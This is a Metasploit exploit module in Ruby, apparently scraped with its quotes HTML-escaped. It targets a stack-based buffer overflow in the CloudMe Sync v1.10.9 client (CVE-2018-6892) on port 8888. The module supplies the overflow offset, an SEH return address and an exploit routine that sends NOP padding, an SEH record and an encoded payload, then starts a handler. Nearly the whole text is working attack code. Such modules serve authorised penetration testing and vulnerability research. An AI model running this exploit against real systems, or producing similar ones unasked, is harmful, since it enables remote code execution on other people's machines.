# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;CloudMe Sync v1.10.9&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a stack-based buffer overflow vulnerability
        in CloudMe Sync v1.10.9 client application. This module has been
        tested successfully on Windows 7 SP1 x86.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;hyp3rlinx&#039;,      # Original exploit author
          &#039;Daniel Teixeira&#039; # MSF module author
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2018-6892&#039;],
          [ &#039;EDB&#039;, &#039;44027&#039; ],
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;   => "\x00",
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;CloudMe Sync v1.10.9&#039;,
            {
              &#039;Offset&#039; => 2232,
              &#039;Ret&#039;    => 0x61e7b7f6
            }
          ]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Jan 17 2018&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options([Opt::RPORT(8888)])

  end

  def exploit
    connect

    buffer = make_nops(target[&#039;Offset&#039;])
    buffer << generate_seh_record(target.ret)
    buffer << payload.encoded

    sock.put(buffer)
    handler
  end
end

